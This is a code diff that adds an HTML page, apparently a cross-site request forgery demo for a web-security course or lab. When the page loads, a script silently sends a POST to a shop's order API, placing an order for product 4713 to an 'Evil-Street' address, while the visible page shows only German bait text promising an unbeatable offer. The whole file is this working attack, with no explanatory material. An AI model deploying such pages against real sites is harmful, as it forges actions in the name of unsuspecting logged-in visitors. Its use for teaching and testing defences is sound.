@@ -1,0 +1,28 @@
+<html>
+    <head>
+        <title>Shop</title>
+        <script type="text/javascript">
+
+            function buy() {
+                fetch("https://nf-shop.herokuapp.com/api/orders", {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        product: '4713',
+                        name: 'Andre Schreck',
+                        street: 'Evil-Street 1',
+                        zip: '666',
+                        city: 'Eviltown',
+                    })
+                });
+            }
+
+        </script>
+    </head>
+
+    <body onload="buy()">
+        Ich habe ein unschlagbares Angebot für dich!!!
+    </body>
+</html>
